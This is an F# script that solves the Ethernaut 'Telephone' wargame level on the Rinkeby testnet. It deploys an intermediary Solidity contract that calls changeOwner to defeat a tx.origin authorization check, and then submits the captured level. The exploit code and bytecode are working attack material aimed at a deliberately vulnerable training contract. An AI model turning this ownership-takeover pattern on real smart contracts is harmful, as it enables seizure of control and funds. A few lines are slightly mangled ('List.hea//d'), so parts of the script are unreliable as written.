#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.4.8" 


open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let web3c = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let monitor = createReceiptMonitor web3c

let call = makeEthCall web3c constants
let txn = makeEthTxn web3c constants

let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut


// Get a level instance, you pass in the address of ( I guess) the base or prototype of the contract, and you
// get a copy, logged via the Event emitted inside `createLevelInstance` 
//txnEthernaut (ByString "createLevelInstance") [Address "0x0b6F6CE4BCfB70525A31454292017F640C10c768"] "0"
//|> monitorTransaction monitor


// deployed to 0xb278b46aa915f41c310a5307137acc3d76caf6fc

let level4ABI = """[{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI
let level4 = loadDeployedContract digest "0xb278b46aa915f41c310a5307137acc3d76caf6fc" RINKEBY level4ABI |> bindDeployedContract |> List.head

//partials
let callLevel4 = makeEthCall web3c constants level4 
let txnLevel4 = makeEthTxn web3c constants level4


//level4.functions
|> List.iter(fun p -> printfn $"functions: {p.name}, {p.hash}, {p.canonicalInputs}, {p.config}")
//functions: changeOwner, EVMFunctionHash "0xa6f9dae1", EVMFunctionInputs "(address)", Nonpayable
//functions: owner, EVMFunctionHash "0x8da5cb5b", EVMFunctionInputs "()", View
//functions: receive, EVMFunctionHash "0xa3e76c0f", EVMFunctionInputs "()", Payable

// Win condition: Take ownership

// Looks like I need to deploy a contract like the following, and have it call the `changeOwner()` function

(*
    pragma solidity ^0.6.0;

    import "./Telephone.sol";

    contract Caller {

        Telephone telephone = Telephone(0xb278b46aa915f41c310a5307137acc3d76caf6fc);

        function makeCall(address _newOwner) public {
            telephone.changeOwner(_newOwner);
        }
    }
*)

let callerABI = """[{"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"makeCall","outputs":[],"stateMutability":"nonpayable","type":"function"}]""" |> ABI
let callerBytecode = """608060405273b278b46aa915f41c310a5307137acc3d76caf6fc6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5061014e806100746000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80637ff76d7214610030575b600080fd5b6100726004803603602081101561004657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610074565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156100fd57600080fd5b505af1158015610111573d6000803e3d6000fd5b505050505056fea2646970667358221220d0d50293144474cfd4928306ab7d0a289b0399c87fc49d08248ad9551e9aa27e64736f6c634300060c0033""" |> RawContractBytecode
prepareUndeployedContract digest callerBytecode None RINKEBY callerABI
|> Result.bind (deployEthContract web3c constants)
|> monitorTransaction monitor
let caller = loadDeployedContract digest "0x64314f9b5e5ba8a876510b49896116bff6585f12" RINKEBY callerABI |> bindDeployedContract |> List.hea//d

makeEthTxn web3c constants caller (ByString "makeCall") [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"] ZEROV
|> monitorTransaction monitor

callLevel4 (ByString "owner") []
|> logCallResult

txnEthernaut (ByString "submitLevelInstance") [Address "0xb278b46aa915f41c310a5307137acc3d76caf6fc"] ZEROV
|> monitorTransaction monitor
